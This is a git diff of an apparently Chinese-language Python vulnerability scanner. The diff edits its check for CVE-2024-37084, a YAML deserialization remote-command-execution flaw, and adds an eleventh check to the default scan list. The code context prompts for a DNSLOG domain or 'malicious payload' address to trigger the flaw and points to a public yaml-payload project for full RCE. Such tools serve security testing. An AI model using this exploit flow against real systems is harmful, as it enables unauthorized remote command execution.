@@ -629,19 +629,18 @@ def CVE_2024_37084(url, proxies, header_new):
 
     try:
         try:
-            cprint("")
             response = requests.get(url + "api/package/", headers=Headers_1, timeout=outtime, verify=False, proxies=proxies)
             response.raise_for_status()
             data = response.json()
             upload_href = data.get('_links', {}).get('upload', {}).get('href')
             install_href = data.get('_links', {}).get('install', {}).get('href')
             if upload_href and install_href:
-                cprint("[+] CVE-2024-37084漏洞可能存在，请输入dnslog提供的域名进一步验证\n", "red")
+                cprint("[+] CVE-2024-37084远程命令执行漏洞可能存在，请输入dnslog提供的域名进一步验证\n", "red")
             elif not upload_href or not install_href:
-                cprint("[-] CVE-2024-37084漏洞不存在\n", "yellow")
+                cprint("[-] CVE-2024-37084远程命令执行漏洞不存在\n", "yellow")
                 return
         except Exception as e:
-            cprint("[-] CVE-2024-37084漏洞不存在\n", "yellow")
+            cprint("[-] CVE-2024-37084远程命令执行漏洞不存在\n", "yellow")
             return
 
         dnslog = input("[+] 请输入DNSLOG的域名，或是恶意payload的地址>>> ")
@@ -691,11 +690,11 @@ def CVE_2024_37084(url, proxies, header_new):
 
             data = response.json()
             if data.get("exception") == "org.yaml.snakeyaml.constructor.ConstructorException":
-                cprint(f"[+] 目标 {url} 存在CVE-2024-37084漏洞，已成功触发DNSLOG", "red")
+                cprint(f"[+] 目标 {url} 存在CVE-2024-37084远程命令执行漏洞，已成功触发DNSLOG", "red")
                 cprint(f"[+] 请前往DNSLOG平台查看是否有记录回连，并考虑使用https://github.com/artsploit/yaml-payload进行进一步RCE利用", "red")
                 cprint(f"[+] 将请求yaml-payload的地址填到原本dnslog位置即可\n", "red")
             else:
-                cprint("[-] CVE-2024-37084漏洞不存在\n", "yellow")
+                cprint("[-] CVE-2024-37084远程命令执行漏洞不存在\n", "yellow")
 
     except KeyboardInterrupt:
         print("Ctrl + C 手动终止了进程")
@@ -731,7 +730,7 @@ def vul(url, proxies, header_new):
     try:
         choices = input("\n请输入要检测的漏洞 (例子：1,3,5 直接回车即检测全部漏洞): ")
         if choices == '':
-            choices = "1,2,3,4,5,6,7,8,9,10"
+            choices = "1,2,3,4,5,6,7,8,9,10,11"
         choices = [int(choice) for choice in choices.split(',')]
     except Exception as e:
         print("请不要输入无意义的字符串")
